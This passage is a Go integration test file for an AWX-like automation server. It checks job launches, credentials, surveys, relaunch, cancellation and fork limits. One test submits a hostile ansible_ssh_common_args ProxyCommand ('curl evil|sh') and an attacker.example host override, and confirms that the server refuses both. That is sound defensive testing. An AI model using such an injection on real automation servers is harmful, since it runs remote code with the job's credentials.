package test

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"

	"github.com/damhau/awxnext/internal/resources"
)

func requireAnsible(t *testing.T) {
	t.Helper()
	if _, err := exec.LookPath("ansible-runner"); err != nil {
		t.Skip("ansible-runner not installed")
	}
}

type jobFixture struct {
	a        *client
	org, inv int64
	project  int64
	repo     string
	hosts    []string
}

const sitePlaybook = `- name: Site
  hosts: all
  gather_facts: false
  tasks:
    - ansible.builtin.debug:
        msg: "hello {{ who | default('nobody') }} from {{ inventory_hostname }}"
    - ansible.builtin.debug:
        msg: "secret length {{ (secret | default('')) | length }}"
    - ansible.builtin.debug:
        msg: "raw={{ raw | default('none') }}"
    - ansible.builtin.set_stats:
        data: {deployed_version: "{{ version | default('v0') }}"}
      run_once: true
`

const failPlaybook = `- hosts: all
  gather_facts: false
  tasks:
    - ansible.builtin.fail:
        msg: "boom on {{ inventory_hostname }}"
      when: inventory_hostname == 'h2'
    - ansible.builtin.debug: msg=after
`

const slowPlaybook = `- hosts: all
  gather_facts: false
  tasks:
    - ansible.builtin.pause:
        seconds: 30
      run_once: true
`

// pausePlaybook is quiet for a few seconds, long enough for keepalives.
const pausePlaybook = `- hosts: all
  gather_facts: false
  tasks:
    - ansible.builtin.pause:
        seconds: 3
      run_once: true
`

const factsPlaybook = `- hosts: all
  gather_facts: false
  tasks:
    - ansible.builtin.debug:
        msg: "cached={{ app_color | default('none') }}"
    - ansible.builtin.set_fact:
        app_color: blue
        cacheable: true
`

const envPlaybook = `- hosts: all
  gather_facts: false
  tasks:
    - ansible.builtin.debug:
        msg: "token length {{ lookup('ansible.builtin.env', 'MYCLOUD_TOKEN') | length }} region={{ lookup('ansible.builtin.file', lookup('ansible.builtin.env', 'MYCLOUD_CONFIG')) }}"
      run_once: true
`

func newJobFixture(t *testing.T) *jobFixture {
	t.Helper()
	requireAnsible(t)
	return newLaunchFixture(t)
}

// newLaunchFixture sets up a project, an inventory and hosts without needing
// ansible-runner: enough to test what a launch accepts.
func newLaunchFixture(t *testing.T) *jobFixture {
	t.Helper()
	a := adminClient(t)
	allowFileURLs(t, a)
	f := &jobFixture{a: a, org: newOrg(t, a), hosts: []string{"h1", "h2", "h3"}}
	f.repo = gitRepo(t, map[string]string{
		"site.yml": sitePlaybook, "fail.yml": failPlaybook, "slow.yml": slowPlaybook, "facts.yml": factsPlaybook, "env.yml": envPlaybook,
		"pause.yml": pausePlaybook,
	})
	f.project = must(t, a.post("projects/", map[string]any{"name": uniq("proj"), "organization": f.org, "scm_type": "git", "scm_url": f.repo, "allow_override": true}), 201).id()
	f.waitProject(t)
	f.inv = must(t, a.post("inventories/", map[string]any{"name": uniq("inv"), "organization": f.org,
		"variables": "ansible_connection: local\nansible_python_interpreter: '{{ ansible_playbook_python }}'\n"}), 201).id()
	for _, h := range f.hosts {
		must(t, a.post("hosts/", map[string]any{"name": h, "inventory": f.inv}), 201)
	}
	return f
}

func (f *jobFixture) waitProject(t *testing.T) {
	t.Helper()
	deadline := time.Now().Add(30 * time.Second)
	for time.Now().Before(deadline) {
		p := f.a.get(fmt.Sprintf("projects/%d/", f.project))
		if p.Body["scm_revision"] != "" && p.Body["status"] == "successful" {
			return
		}
		if p.Body["status"] == "failed" {
			t.Fatalf("project sync failed")
		}
		time.Sleep(100 * time.Millisecond)
	}
	t.Fatal("project never synced")
}

func (f *jobFixture) template(t *testing.T, playbook string, extra map[string]any) int64 {
	t.Helper()
	body := map[string]any{"name": uniq("jt"), "project": f.project, "inventory": f.inv, "playbook": playbook}
	for k, v := range extra {
		body[k] = v
	}
	return must(t, f.a.post("job_templates/", body), 201).id()
}

func (f *jobFixture) launch(t *testing.T, c *client, jt int64, body map[string]any) resp {
	t.Helper()
	r := must(t, c.post(fmt.Sprintf("job_templates/%d/launch/", jt), body), 201)
	return waitJob(t, f.a, fmt.Sprintf("jobs/%d/", r.id()))
}

func (f *jobFixture) stdout(t *testing.T, job int64) string {
	return f.a.get(fmt.Sprintf("jobs/%d/stdout/?format=txt", job)).Raw
}

func mustStatus(t *testing.T, f *jobFixture, job resp, want string) {
	t.Helper()
	if job.Body["status"] != want {
		t.Fatalf("job status %v (want %s): %v\n%s", job.Body["status"], want, job.Body["job_explanation"], f.stdout(t, job.id()))
	}
}

func TestJobTemplateValidation(t *testing.T) {
	f := newJobFixture(t)
	a := f.a
	must(t, a.post("job_templates/", map[string]any{"name": uniq("jt"), "inventory": f.inv, "playbook": "site.yml"}), 400)
	must(t, a.post("job_templates/", map[string]any{"name": uniq("jt"), "project": f.project, "playbook": "site.yml"}), 400)
	must(t, a.post("job_templates/", map[string]any{"name": uniq("jt"), "project": f.project, "inventory": f.inv, "playbook": "missing.yml"}), 400)
	jt := f.template(t, "site.yml", nil)
	r := must(t, a.get(fmt.Sprintf("job_templates/%d/", jt)), 200)
	if org, _ := r.Body["organization"].(float64); int64(org) != f.org {
		t.Fatalf("organization not derived from project: %v", r.Body["organization"])
	}
	// Credential slot rules.
	ssh := credType(t, a, "ssh")
	m1 := must(t, a.post("credentials/", map[string]any{"name": uniq("m"), "organization": f.org, "credential_type": ssh}), 201).id()
	m2 := must(t, a.post("credentials/", map[string]any{"name": uniq("m"), "organization": f.org, "credential_type": ssh}), 201).id()
	vt := credType(t, a, "vault")
	v1 := must(t, a.post("credentials/", map[string]any{"name": uniq("v"), "organization": f.org, "credential_type": vt, "inputs": map[string]any{"vault_password": "x", "vault_id": "dev"}}), 201).id()
	v2 := must(t, a.post("credentials/", map[string]any{"name": uniq("v"), "organization": f.org, "credential_type": vt, "inputs": map[string]any{"vault_password": "x", "vault_id": "prod"}}), 201).id()
	v3 := must(t, a.post("credentials/", map[string]any{"name": uniq("v"), "organization": f.org, "credential_type": vt, "inputs": map[string]any{"vault_password": "x", "vault_id": "prod"}}), 201).id()
	scm := must(t, a.post("credentials/", map[string]any{"name": uniq("s"), "organization": f.org, "credential_type": credType(t, a, "scm")}), 201).id()
	must(t, a.post(fmt.Sprintf("job_templates/%d/credentials/", jt), map[string]any{"id": m1}), 204)
	must(t, a.post(fmt.Sprintf("job_templates/%d/credentials/", jt), map[string]any{"id": m2}), 400)
	must(t, a.post(fmt.Sprintf("job_templates/%d/credentials/", jt), map[string]any{"id": v1}), 204)
	must(t, a.post(fmt.Sprintf("job_templates/%d/credentials/", jt), map[string]any{"id": v2}), 204)
	must(t, a.post(fmt.Sprintf("job_templates/%d/credentials/", jt), map[string]any{"id": v3}), 400)
	must(t, a.post(fmt.Sprintf("job_templates/%d/credentials/", jt), map[string]any{"id": scm}), 400)
	// Labels by name are created once and reused.
	must(t, a.post(fmt.Sprintf("job_templates/%d/labels/", jt), map[string]any{"name": "prod-critical"}), 201)
	jt2 := f.template(t, "site.yml", nil)
	must(t, a.post(fmt.Sprintf("job_templates/%d/labels/", jt2), map[string]any{"name": "prod-critical"}), 204)
	r = must(t, a.get(fmt.Sprintf("job_templates/%d/", jt)), 200)
	sf := r.Body["summary_fields"].(map[string]any)
	if len(sf["credentials"].([]any)) != 3 || sf["labels"].(map[string]any)["count"].(float64) != 1 {
		t.Fatalf("summary: %v", sf)
	}
	// Branch override requires allow_override on the project.
	must(t, a.patch(fmt.Sprintf("projects/%d/", f.project), map[string]any{"allow_override": false}), 200)
	must(t, a.patch(fmt.Sprintf("job_templates/%d/", jt), map[string]any{"scm_branch": "main"}), 400)
	must(t, a.patch(fmt.Sprintf("projects/%d/", f.project), map[string]any{"allow_override": true}), 200)
}

func TestJobRun(t *testing.T) {
	f := newJobFixture(t)
	a := f.a
	jt := f.template(t, "site.yml", map[string]any{"extra_vars": "who: world\nversion: v2.14.3"})
	info := must(t, a.get(fmt.Sprintf("job_templates/%d/launch/", jt)), 200)
	if info.Body["can_start_without_user_input"] != true {
		t.Fatalf("launch info: %s", info.Raw)
	}
	launched := must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{}), 201)
	job := waitJob(t, a, fmt.Sprintf("jobs/%d/", launched.id()))
	mustStatus(t, f, job, "successful")
	out := f.stdout(t, job.id())
	for _, want := range []string{"hello world from h1", "hello world from h3", "PLAY RECAP"} {
		if !strings.Contains(out, want) {
			t.Fatalf("stdout missing %q:\n%s", want, out)
		}
	}
	if job.Body["artifacts"].(map[string]any)["deployed_version"] != "v2.14.3" {
		t.Fatalf("artifacts: %v", job.Body["artifacts"])
	}
	if len(job.Body["scm_revision"].(string)) != 40 || !strings.Contains(job.Body["job_args"].(string), "site.yml") {
		t.Fatalf("job details: rev=%v args=%v", job.Body["scm_revision"], job.Body["job_args"])
	}
	sums := must(t, a.get(fmt.Sprintf("jobs/%d/job_host_summaries/", job.id())), 200)
	if sums.count() != 3 {
		t.Fatalf("host summaries: %d", sums.count())
	}
	if hsc := job.Body["host_status_counts"].(map[string]any); hsc["ok"].(float64) != 3 {
		t.Fatalf("host_status_counts: %v", hsc)
	}
	evs := must(t, a.get(fmt.Sprintf("jobs/%d/job_events/?event=runner_on_ok&page_size=50", job.id())), 200)
	if evs.count() < 6 {
		t.Fatalf("runner_on_ok events: %d", evs.count())
	}
	ev := evs.results()[0]
	if ev["host_name"] == "" || ev["task"] == "" || ev["event_display"] != "Host OK" || ev["host"] == nil {
		t.Fatalf("event fields: %v", ev)
	}
	h := must(t, a.get(fmt.Sprintf("hosts/?inventory=%d&name=h1", f.inv)), 200).results()[0]
	if h["last_job"] == nil || int64(h["last_job"].(float64)) != job.id() {
		t.Fatalf("host last_job: %v", h["last_job"])
	}
	jtr := must(t, a.get(fmt.Sprintf("job_templates/%d/", jt)), 200)
	if jtr.Body["status"] != "successful" || jtr.Body["summary_fields"].(map[string]any)["last_job"] == nil {
		t.Fatalf("template status: %v", jtr.Body["status"])
	}

	// Prompted limit.
	must(t, a.patch(fmt.Sprintf("job_templates/%d/", jt), map[string]any{"ask_limit_on_launch": true}), 200)
	job = f.launch(t, a, jt, map[string]any{"limit": "h2"})
	mustStatus(t, f, job, "successful")
	if n := must(t, a.get(fmt.Sprintf("jobs/%d/job_host_summaries/", job.id())), 200).count(); n != 1 {
		t.Fatalf("limit not applied: %d hosts", n)
	}
	if job.Body["limit"] != "h2" {
		t.Fatalf("job limit: %v", job.Body["limit"])
	}
}

func TestJobSurveyAndUnsafeVars(t *testing.T) {
	f := newJobFixture(t)
	a := f.a
	jt := f.template(t, "site.yml", map[string]any{"survey_enabled": true, "ask_variables_on_launch": true})
	spec := map[string]any{"name": "Deploy", "description": "", "spec": []any{
		map[string]any{"question_name": "Who", "variable": "who", "type": "text", "required": true, "min": 2, "max": 20},
		map[string]any{"question_name": "Secret", "variable": "secret", "type": "password", "required": false, "default": "s3cr3t!"},
		map[string]any{"question_name": "Env", "variable": "env_name", "type": "multiplechoice", "required": true, "choices": "staging\nprod", "default": "staging"},
	}}
	must(t, a.post(fmt.Sprintf("job_templates/%d/survey_spec/", jt), map[string]any{"name": "x", "spec": []any{map[string]any{"type": "bogus"}}}), 400)
	must(t, a.post(fmt.Sprintf("job_templates/%d/survey_spec/", jt), spec), 200)
	got := must(t, a.get(fmt.Sprintf("job_templates/%d/survey_spec/", jt)), 200)
	if !strings.Contains(got.Raw, `"default":"$encrypted$"`) {
		t.Fatalf("password default not masked: %s", got.Raw)
	}
	info := must(t, a.get(fmt.Sprintf("job_templates/%d/launch/", jt)), 200)
	if fmt.Sprint(info.Body["variables_needed_to_start"]) != "[who]" {
		t.Fatalf("variables_needed_to_start: %v", info.Body["variables_needed_to_start"])
	}
	r := must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{}), 400)
	if !strings.Contains(r.Raw, "'who' value missing") {
		t.Fatalf("missing answer error: %s", r.Raw)
	}
	must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{"extra_vars": map[string]any{"who": "x"}}), 400)
	must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{"extra_vars": map[string]any{"who": "ops", "env_name": "qa"}}), 400)
	// Launch-time Jinja is not templated (ALLOW_JINJA_IN_EXTRA_VARS=template).
	job := f.launch(t, a, jt, map[string]any{"extra_vars": map[string]any{"who": "ops-team", "raw": "{{ 7 * 6 }}"}})
	mustStatus(t, f, job, "successful")
	out := f.stdout(t, job.id())
	if !strings.Contains(out, "hello ops-team from h1") || !strings.Contains(out, "secret length 7") {
		t.Fatalf("survey values not applied:\n%s", out)
	}
	if strings.Contains(out, "raw=42") || !strings.Contains(out, "raw={{ 7 * 6 }}") {
		t.Fatalf("launch-time Jinja was evaluated:\n%s", out)
	}
	if strings.Contains(job.Body["extra_vars"].(string), "s3cr3t") || !strings.Contains(job.Body["extra_vars"].(string), "$encrypted$") {
		t.Fatalf("survey password exposed in job extra_vars: %v", job.Body["extra_vars"])
	}
}

func TestJobVaultAndCustomCredentials(t *testing.T) {
	f := newJobFixture(t)
	a := f.a
	vaultBin, err := exec.LookPath("ansible-vault")
	if err != nil {
		t.Skip("ansible-vault not installed")
	}
	pwFile := t.TempDir() + "/pw"
	os.WriteFile(pwFile, []byte("vaultpass\n"), 0o600)
	enc, err := exec.Command(vaultBin, "encrypt_string", "--vault-id", "prod@"+pwFile, "top secret value", "--name", "db_password").Output()
	if err != nil {
		t.Fatal(err)
	}
	commitFiles(t, f.repo, map[string]string{
		"vars/secrets.yml": string(enc),
		"vault.yml":        "- hosts: all\n  gather_facts: false\n  vars_files: [vars/secrets.yml]\n  tasks:\n    - debug:\n        msg: \"db password length {{ db_password | length }}\"\n      run_once: true\n",
	}, "vault")
	must(t, a.post(fmt.Sprintf("projects/%d/update/", f.project), nil), 202)
	time.Sleep(300 * time.Millisecond)
	f.waitProject(t)
	jt := f.template(t, "vault.yml", nil)
	vt := credType(t, a, "vault")
	vc := must(t, a.post("credentials/", map[string]any{"name": uniq("v"), "organization": f.org, "credential_type": vt,
		"inputs": map[string]any{"vault_password": "vaultpass", "vault_id": "prod"}}), 201).id()
	must(t, a.post(fmt.Sprintf("job_templates/%d/credentials/", jt), map[string]any{"id": vc}), 204)
	job := f.launch(t, a, jt, nil)
	mustStatus(t, f, job, "successful")
	if out := f.stdout(t, job.id()); !strings.Contains(out, "db password length 16") {
		t.Fatalf("vault decryption:\n%s", out)
	}
	// Prompt-on-launch vault password.
	ask := must(t, a.post("credentials/", map[string]any{"name": uniq("v"), "organization": f.org, "credential_type": vt,
		"inputs": map[string]any{"vault_password": "ASK", "vault_id": "prod"}}), 201).id()
	must(t, a.post(fmt.Sprintf("job_templates/%d/credentials/", jt), map[string]any{"id": vc, "disassociate": true}), 204)
	must(t, a.post(fmt.Sprintf("job_templates/%d/credentials/", jt), map[string]any{"id": ask}), 204)
	r := must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{}), 400)
	if fmt.Sprint(r.Body["passwords_needed_to_start"]) != "[vault_password.prod]" {
		t.Fatalf("passwords needed: %s", r.Raw)
	}
	job = f.launch(t, a, jt, map[string]any{"credential_passwords": map[string]any{"vault_password.prod": "vaultpass"}})
	mustStatus(t, f, job, "successful")

	// Custom credential type: env and file injectors.
	ct := must(t, a.post("credential_types/", map[string]any{"name": uniq("mycloud"), "kind": "cloud",
		"inputs": map[string]any{"fields": []any{map[string]any{"id": "token", "label": "Token", "secret": true}, map[string]any{"id": "region", "label": "Region"}}},
		"injectors": map[string]any{"env": map[string]any{"MYCLOUD_TOKEN": "{{ token }}", "MYCLOUD_CONFIG": "{{ tower.filename.cfg }}"},
			"file": map[string]any{"template.cfg": "{{ region }}"}}}), 201).id()
	cc := must(t, a.post("credentials/", map[string]any{"name": uniq("c"), "organization": f.org, "credential_type": ct,
		"inputs": map[string]any{"token": "abcdefghij", "region": "eu-west"}}), 201).id()
	ejt := f.template(t, "env.yml", nil)
	must(t, a.post(fmt.Sprintf("job_templates/%d/credentials/", ejt), map[string]any{"id": cc}), 204)
	job = f.launch(t, a, ejt, nil)
	mustStatus(t, f, job, "successful")
	if out := f.stdout(t, job.id()); !strings.Contains(out, "token length 10 region=eu-west") {
		t.Fatalf("injectors:\n%s", out)
	}
	if strings.Contains(fmt.Sprint(job.Body["job_env"]), "abcdefghij") {
		t.Fatal("secret leaked in job_env")
	}
}

func TestJobFailureRelaunchCancelTimeout(t *testing.T) {
	f := newJobFixture(t)
	a := f.a
	jt := f.template(t, "fail.yml", nil)
	job := f.launch(t, a, jt, nil)
	mustStatus(t, f, job, "failed")
	if hsc := job.Body["host_status_counts"].(map[string]any); hsc["failures"].(float64) != 1 {
		t.Fatalf("host_status_counts: %v", hsc)
	}
	rl := must(t, a.get(fmt.Sprintf("jobs/%d/relaunch/", job.id())), 200)
	if rl.Body["retry_counts"].(map[string]any)["failed"].(float64) != 1 {
		t.Fatalf("retry counts: %v", rl.Body)
	}
	r := must(t, a.post(fmt.Sprintf("jobs/%d/relaunch/", job.id()), map[string]any{"hosts": "failed"}), 201)
	again := waitJob(t, a, fmt.Sprintf("jobs/%d/", r.id()))
	if again.Body["limit"] != "h2" || again.Body["launch_type"] != "relaunch" {
		t.Fatalf("relaunch: limit=%v type=%v", again.Body["limit"], again.Body["launch_type"])
	}

	slow := f.template(t, "slow.yml", nil)
	started := must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", slow), nil), 201).id()
	deadline := time.Now().Add(20 * time.Second)
	for time.Now().Before(deadline) {
		if a.get(fmt.Sprintf("jobs/%d/", started)).Body["status"] == "running" && a.get(fmt.Sprintf("jobs/%d/job_events/", started)).count() > 0 {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	if c := must(t, a.get(fmt.Sprintf("jobs/%d/cancel/", started)), 200); c.Body["can_cancel"] != true {
		t.Fatal("running job should be cancelable")
	}
	must(t, a.post(fmt.Sprintf("jobs/%d/cancel/", started), nil), 202)
	canceled := waitJob(t, a, fmt.Sprintf("jobs/%d/", started))
	if canceled.Body["status"] != "canceled" {
		t.Fatalf("cancel: %v", canceled.Body["status"])
	}
	must(t, a.delete(fmt.Sprintf("jobs/%d/", started)), 204)

	must(t, a.patch(fmt.Sprintf("job_templates/%d/", slow), map[string]any{"timeout": 2}), 200)
	job = f.launch(t, a, slow, nil)
	if job.Body["status"] != "failed" || job.Body["job_explanation"] != "Job terminated due to timeout" {
		t.Fatalf("timeout: %v %v", job.Body["status"], job.Body["job_explanation"])
	}
}

func TestJobFactCacheAndProjectUpdateOnLaunch(t *testing.T) {
	f := newJobFixture(t)
	a := f.a
	jt := f.template(t, "facts.yml", map[string]any{"use_fact_cache": true})
	job := f.launch(t, a, jt, nil)
	mustStatus(t, f, job, "successful")
	h := must(t, a.get(fmt.Sprintf("hosts/?inventory=%d&name=h3", f.inv)), 200).results()[0]
	facts := must(t, a.get(fmt.Sprintf("hosts/%d/ansible_facts/", int64(h["id"].(float64)))), 200)
	if facts.Body["app_color"] != "blue" {
		t.Fatalf("fact cache not saved: %s", facts.Raw)
	}
	// The next run starts with the saved facts.
	job = f.launch(t, a, jt, nil)
	mustStatus(t, f, job, "successful")
	if out := f.stdout(t, job.id()); !strings.Contains(out, "cached=blue") {
		t.Fatalf("cached facts not offered to the next run:\n%s", out)
	}

	// Update on launch picks up a new commit through a dependency.
	must(t, a.patch(fmt.Sprintf("projects/%d/", f.project), map[string]any{"scm_update_on_launch": true}), 200)
	sha := commitFiles(t, f.repo, map[string]string{"site.yml": sitePlaybook + "# new\n"}, "new")
	jt2 := f.template(t, "site.yml", nil)
	job = f.launch(t, a, jt2, nil)
	mustStatus(t, f, job, "successful")
	if job.Body["scm_revision"] != sha {
		t.Fatalf("job ran old revision %v, want %v", job.Body["scm_revision"], sha)
	}
	deps := must(t, a.get(fmt.Sprintf("project_updates/?unified_job_template=%d&launch_type=dependency", f.project)), 200)
	if deps.count() < 1 {
		t.Fatal("no dependency project update")
	}
	// Branch override at launch checks out that revision for the job only.
	exec.Command("git", "-C", f.repo, "branch", "feature").Run()
	must(t, a.patch(fmt.Sprintf("job_templates/%d/", jt2), map[string]any{"ask_scm_branch_on_launch": true}), 200)
	job = f.launch(t, a, jt2, map[string]any{"scm_branch": "feature"})
	mustStatus(t, f, job, "successful")
	if job.Body["scm_branch"] != "feature" {
		t.Fatalf("branch: %v", job.Body["scm_branch"])
	}
}

func TestJobAccess(t *testing.T) {
	f := newJobFixture(t)
	a := f.a
	jt := f.template(t, "site.yml", nil)
	u, uid := newUser(t, a)
	must(t, u.post(fmt.Sprintf("job_templates/%d/launch/", jt), nil), 403)
	must(t, a.post("role_user_assignments/", map[string]any{"role_definition": roleDef(t, "JobTemplate Execute"), "user": uid, "object_id": jt}), 201)
	job := f.launch(t, u, jt, nil)
	mustStatus(t, f, job, "successful")
	must(t, u.get(fmt.Sprintf("jobs/%d/", job.id())), 200)
	must(t, u.patch(fmt.Sprintf("job_templates/%d/", jt), map[string]any{"limit": "x"}), 403)
	must(t, u.delete(fmt.Sprintf("jobs/%d/", job.id())), 403)
	// Others cannot see the job.
	o, _ := newUser(t, a)
	must(t, o.get(fmt.Sprintf("jobs/%d/", job.id())), 403)
	if n := must(t, o.get(fmt.Sprintf("unified_jobs/?id=%d", job.id())), 200).count(); n != 0 {
		t.Fatal("unified_jobs leaks jobs")
	}
}

// A launch field the template does not prompt for is refused: AWX ignores it
// and starts the job anyway, so a limit meant for one host runs everywhere.
// IGNORE_UNPROMPTED_LAUNCH_FIELDS brings AWX's behaviour back.
func TestLaunchRefusesUnpromptedFields(t *testing.T) {
	f := newLaunchFixture(t)
	a := f.a
	jt := f.template(t, "site.yml", nil)
	jobsOf := func() float64 {
		return must(t, a.get(fmt.Sprintf("job_templates/%d/jobs/", jt)), 200).Body["count"].(float64)
	}

	r := must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{"limit": "h1"}), 400)
	if !strings.Contains(r.Raw, "Field is not configured to prompt on launch") {
		t.Fatalf("limit: %s", r.Raw)
	}
	r = must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{"extra_vars": map[string]any{"target": "all", "env": "prod"}}), 400)
	if !strings.Contains(r.Raw, "Variables env, target are not allowed on launch") {
		t.Fatalf("extra_vars: %s", r.Raw)
	}
	if n := jobsOf(); n != 0 {
		t.Fatalf("a refused launch created %v jobs", n)
	}
	// Empty values change nothing and pass.
	must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{"limit": "", "extra_vars": map[string]any{}}), 201)

	// Prompted fields are taken.
	asks := f.template(t, "site.yml", map[string]any{"ask_limit_on_launch": true})
	job := must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", asks), map[string]any{"limit": "h1"}), 201)
	if got := must(t, a.get(fmt.Sprintf("jobs/%d/", job.id())), 200).Body["limit"]; got != "h1" {
		t.Fatalf("prompted limit: %v", got)
	}

	// Workflow templates too.
	wf := must(t, a.post("workflow_job_templates/", map[string]any{"name": uniq("wf"), "organization": f.org}), 201).id()
	must(t, a.post(fmt.Sprintf("workflow_job_templates/%d/launch/", wf), map[string]any{"limit": "h1"}), 400)

	// AWX's behaviour on request: ignored and reported.
	must(t, a.patch("settings/jobs/", map[string]any{"IGNORE_UNPROMPTED_LAUNCH_FIELDS": true}), 200)
	t.Cleanup(func() { a.patch("settings/jobs/", map[string]any{"IGNORE_UNPROMPTED_LAUNCH_FIELDS": false}) })
	r = must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{"limit": "h1"}), 201)
	if _, ok := r.Body["ignored_fields"].(map[string]any)["limit"]; !ok {
		t.Fatalf("ignored_fields: %v", r.Body["ignored_fields"])
	}
	must(t, a.post(fmt.Sprintf("workflow_job_templates/%d/launch/", wf), map[string]any{"limit": "h1"}), 201)
}

// ansible_* variables control how Ansible connects and runs (a ProxyCommand
// in ansible_ssh_common_args runs where the job connects from, with its
// credentials), and extra variables override everything. Whoever launches
// may not set them on any path; the template's own variables may.
func TestLaunchRefusesAnsibleVars(t *testing.T) {
	f := newLaunchFixture(t)
	a := f.a
	evil := map[string]any{"ansible_ssh_common_args": "-o ProxyCommand='sh -c \"curl evil|sh\"'"}
	refused := func(r resp, field string) {
		t.Helper()
		if r.Status != 400 || !strings.Contains(r.Raw, field) || !strings.Contains(r.Raw, "ansible_") {
			t.Fatalf("want 400 on %s naming the variable, got %d: %s", field, r.Status, r.Raw)
		}
	}
	jt := f.template(t, "site.yml", map[string]any{"ask_variables_on_launch": true})
	jobsOf := func(id int64) float64 {
		return must(t, a.get(fmt.Sprintf("job_templates/%d/jobs/", id)), 200).Body["count"].(float64)
	}

	// Job and workflow template launches, in any letter case.
	refused(a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{"extra_vars": evil}), "extra_vars")
	refused(a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{"extra_vars": "ANSIBLE_HOST: attacker.example"}), "extra_vars")
	if n := jobsOf(jt); n != 0 {
		t.Fatalf("a refused launch created %v jobs", n)
	}
	must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{"extra_vars": map[string]any{"app": "web"}}), 201)
	wf := must(t, a.post("workflow_job_templates/", map[string]any{"name": uniq("wf"), "organization": f.org, "ask_variables_on_launch": true}), 201).id()
	refused(a.post(fmt.Sprintf("workflow_job_templates/%d/launch/", wf), map[string]any{"extra_vars": map[string]any{"ansible_connection": "local"}}), "extra_vars")

	// Survey questions on ansible_* variables.
	spec := map[string]any{"name": "s", "description": "", "spec": []any{map[string]any{
		"question_name": "Jump host", "variable": "ansible_ssh_common_args", "type": "text", "required": false}}}
	r := a.post(fmt.Sprintf("job_templates/%d/survey_spec/", jt), spec)
	if r.Status != 400 || !strings.Contains(r.Raw, "ansible_ssh_common_args") {
		t.Fatalf("survey: %d %s", r.Status, r.Raw)
	}

	// Schedules and ad hoc commands.
	refused(a.post(fmt.Sprintf("job_templates/%d/schedules/", jt), map[string]any{"name": uniq("s"),
		"rrule": "DTSTART:20300101T000000Z RRULE:FREQ=DAILY", "extra_data": evil}), "extra_data")
	refused(a.post("ad_hoc_commands/", map[string]any{"inventory": f.inv, "module_name": "ping", "extra_vars": "ansible_connection: local"}), "extra_vars")

	// Relaunch replays the original job; its body only brings passwords.
	plain := f.template(t, "site.yml", nil)
	first := must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", plain), map[string]any{}), 201).id()
	again := must(t, a.post(fmt.Sprintf("jobs/%d/relaunch/", first), map[string]any{"extra_vars": evil, "limit": "h1"}), 201).id()
	job := must(t, a.get(fmt.Sprintf("jobs/%d/", again)), 200)
	if strings.Contains(fmt.Sprint(job.Body["extra_vars"]), "ansible_") || job.Body["limit"] != "" {
		t.Fatalf("relaunch took fields from its body: extra_vars=%v limit=%v", job.Body["extra_vars"], job.Body["limit"])
	}

	// The template's own ansible_* variables are its editors' choice.
	own := f.template(t, "site.yml", map[string]any{"extra_vars": "ansible_python_interpreter: /usr/bin/python3"})
	ownJob := must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", own), map[string]any{}), 201).id()
	must(t, a.post(fmt.Sprintf("jobs/%d/relaunch/", ownJob), map[string]any{}), 201)

	// AWX's behaviour on request; a job launched that way is not replayed once it is off.
	must(t, a.patch("settings/jobs/", map[string]any{"ALLOW_ANSIBLE_VARS_AT_LAUNCH": true}), 200)
	t.Cleanup(func() { a.patch("settings/jobs/", map[string]any{"ALLOW_ANSIBLE_VARS_AT_LAUNCH": false}) })
	allowed := must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{"extra_vars": evil}), 201).id()
	must(t, a.post(fmt.Sprintf("job_templates/%d/survey_spec/", jt), spec), 200)
	must(t, a.patch("settings/jobs/", map[string]any{"ALLOW_ANSIBLE_VARS_AT_LAUNCH": false}), 200)
	refused(a.post(fmt.Sprintf("jobs/%d/relaunch/", allowed), map[string]any{}), "extra_vars")
}

// MAX_FORKS refuses saving or launching with more forks (0: no limit), also
// for templates saved before it was lowered.
func TestMaxForks(t *testing.T) {
	f := newLaunchFixture(t)
	a := f.a
	t.Cleanup(func() { a.patch("settings/jobs/", map[string]any{"MAX_FORKS": 200}) })
	must(t, a.patch("settings/jobs/", map[string]any{"MAX_FORKS": 5}), 200)
	tooMany := func(r resp) {
		t.Helper()
		if r.Status != 400 || !strings.Contains(r.Raw, "Maximum number of forks (5) exceeded") {
			t.Fatalf("want the MAX_FORKS error, got %d: %s", r.Status, r.Raw)
		}
	}

	// Templates.
	tooMany(a.post("job_templates/", map[string]any{"name": uniq("jt"), "project": f.project, "inventory": f.inv, "playbook": "site.yml", "forks": 10}))
	jt := f.template(t, "site.yml", map[string]any{"forks": 5, "ask_forks_on_launch": true})
	tooMany(a.patch(fmt.Sprintf("job_templates/%d/", jt), map[string]any{"forks": 6}))
	// Launches, schedules and ad hoc commands.
	tooMany(a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{"forks": 6}))
	must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{"forks": 3}), 201)
	tooMany(a.post(fmt.Sprintf("job_templates/%d/schedules/", jt), map[string]any{"name": uniq("s"), "rrule": "DTSTART:20300101T000000Z RRULE:FREQ=DAILY", "forks": 6}))
	tooMany(a.post("ad_hoc_commands/", map[string]any{"inventory": f.inv, "module_name": "ping", "forks": 6}))
	// A sliced template saved under a higher limit cannot launch once it is lowered.
	sliced := f.template(t, "site.yml", map[string]any{"forks": 5, "job_slice_count": 2})
	must(t, a.patch("settings/jobs/", map[string]any{"MAX_FORKS": 4}), 200)
	if r := a.post(fmt.Sprintf("job_templates/%d/launch/", sliced), map[string]any{}); r.Status != 400 || !strings.Contains(r.Raw, "Maximum number of forks (4)") {
		t.Fatalf("sliced launch over MAX_FORKS: %d %s", r.Status, r.Raw)
	}
	// 0: no limit.
